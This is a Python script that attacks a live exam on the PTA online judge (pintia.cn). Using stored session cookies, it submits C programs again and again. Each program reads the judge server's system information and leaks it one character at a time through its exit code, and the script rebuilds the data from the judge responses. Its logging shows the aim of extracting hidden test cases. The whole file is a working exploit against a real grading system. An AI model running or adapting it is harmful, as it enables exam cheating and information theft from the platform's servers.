import requests
import time

from loguru import logger
logger.add("sysinfo.log", level="INFO", rotation="10 MB", encoding="utf-8")

NUMBER_ONLY = False
submiturl = "https://pintia.cn/api/exams/1988115709199081472/exam-submissions"
problemSetProblemId = 1987699737594945536

JSESSIONID = "5ED81E1193E93XXXXXXXXXXX"
PTASession = "885e8ff9-b421-43df-8806-xxxxxxxxxxx"
_bl_uid = "sXmIUetat11dysiFLmgyxXxxXXXxx"

payload = "{\"problemType\":\"PROGRAMMING\",\"details\":[{\"problemId\":\"0\",\"problemSetProblemId\":\"" + str(problemSetProblemId) + "\",\"programmingSubmissionDetail\":{\"program\":\"#define LEAK_POS __LEAK_Pos\\n#define NUMBER_ONLY __NUMBER_Only\\n#define LEAK_WA_ANS \\\"__PTA_TestInput_Spy__\\\"\\n\\n#include <stdio.h>\\n#include <dirent.h>\\n#include <string.h>\\n#include <unistd.h>\\n#include <sys/utsname.h>\\n\\ntypedef struct String {\\n    char* str;\\n    size_t len, volume;\\n} String;\\n\\nString* String_New() {\\n    String* s = (String*)malloc(sizeof(String));\\n    s->len = 0;\\n    s->volume = 8;\\n    s->str = (char*)calloc(s->volume, sizeof(char));\\n    return s;\\n}\\n\\nvoid String_Expand(String* s, size_t toLen) {\\n    while (s->volume <= toLen) {\\n        s->volume <<= 1;\\n    }\\n    char* nSpace = (char*)calloc(s->volume, sizeof(char));\\n    memcpy(nSpace, s->str, s->len);\\n    free(s->str);\\n    s->str = nSpace;\\n}\\n\\nString* String_Append(String* s, const char* sApp) {\\n    if (!s || !sApp) {\\n        return s;\\n    }\\n    \\n    size_t sAppLen = strlen(sApp);\\n    size_t nLen = s->len + sAppLen;\\n    if (nLen + 1 >= s->volume) {\\n        String_Expand(s, nLen + 1);\\n    }\\n    strcat(s->str, sApp);\\n    s->len = nLen;\\n    return s;\\n}\\n\\nvoid String_Delete(String* s) {\\n    free(s->str);\\n    free(s);\\n}\\n\\nint main(void) {\\n    struct utsname info;\\n    if (uname(&info) == -1) {\\n        return 250;\\n    }\\n\\n    String* s = String_New();\\n    String_Append(s, info.sysname);\\n    String_Append(s, \\\";\\\");\\n    String_Append(s, info.nodename);\\n    String_Append(s, \\\";\\\");\\n    String_Append(s, info.release);\\n    String_Append(s, \\\";\\\");\\n    String_Append(s, info.version);\\n    String_Append(s, \\\";\\\");\\n    String_Append(s, info.machine);\\n\\n    if (LEAK_POS > s->len) {\\n        puts(LEAK_WA_ANS);\\n        return 0;\\n    }\\n\\n    char ch = s->str[LEAK_POS];\\n    String_Delete(s);\\n    return ch;\\n}\\n\",\"compiler\":\"GCC\"}}]}"
headers = {
  'host': 'pintia.cn',
  'Accept': 'application/json;charset=UTF-8',
  'sec-ch-ua': '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0',
  'X-Lollipop': 'e7087fd7444d121e203b589eb9fca753',
  'Content-Type': 'application/json;charset=UTF-8',
  'X-Marshmallow': '',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'Cookie': f'JSESSIONID={JSESSIONID}; PTASession={PTASession}; _bl_uid={_bl_uid}'
}

def parse_number_only_code(code: int) -> str:
    if code == 10:
        return ' '
    elif code == 11:
        return '\n'
    elif code == 12:
        return '\0'
    elif code == 13:
        return '-'
    else:
        return str(code)

test_inputs: dict[str, str] = {}
leak_over_set: set[str] = set()

ch_idx = 0
while True:
    over_flag: bool = True
    use_payload = payload.replace('__LEAK_Pos', str(ch_idx)).replace("__NUMBER_Only", str(1 if NUMBER_ONLY else 0))
    
    response = {}
    while True:
        response = requests.request("POST", submiturl, headers=headers, data=use_payload).json()
        
        if 'submissionId' in response:
            break
        time.sleep(0.5)

    subId = int(response["submissionId"])

    while (True):
        url = f"https://pintia.cn/api/exams/1988115709199081472/submissions/{subId}?"
        response = requests.request("GET", url, headers=headers, data={})
        response = response.json()
        if (len(response["submission"]["judgeResponseContents"]) > 0):
            break
        time.sleep(0.5)

    cases: dict = response["submission"]["judgeResponseContents"][0]["programmingJudgeResponseContent"]["testcaseJudgeResults"]

    print()
    for k, v in cases.items():
        if k not in test_inputs:
            test_inputs[k] = ""
        
        result = v['result']
        exitcode = v['exitcode']

        if NUMBER_ONLY:
            n = [0, 0]
            n[0] = (exitcode & 0xF0) >> 4
            n[1] = exitcode & 0xF
            chs = ''
            for i in n:
                chs += parse_number_only_code(i)
        else:
            chs = chr(exitcode)

        if k not in leak_over_set:
            over_flag = False
            if result == 'WRONG_ANSWER':
                while test_inputs[k][-1] == '\0':
                    test_inputs[k] = test_inputs[k][:-1]

                logger.success(f"Leak Test Case {k} Success!")
                logger.success(f"Test Case {k}:")
                logger.success(test_inputs[k])
                leak_over_set.add(k)
            else:
                test_inputs[k] += chs
                print(f"Test Case {k}: {test_inputs[k]}")  

    print()

    if over_flag:
        break

    if NUMBER_ONLY:
        ch_idx += 2
    else:
        ch_idx += 1

logger.success('All Test Case Leaked!')
logger.success(test_inputs)

for k, v in test_inputs.items():
    print()
    print(f"Test Case {k}: ")
    print(v)
    print()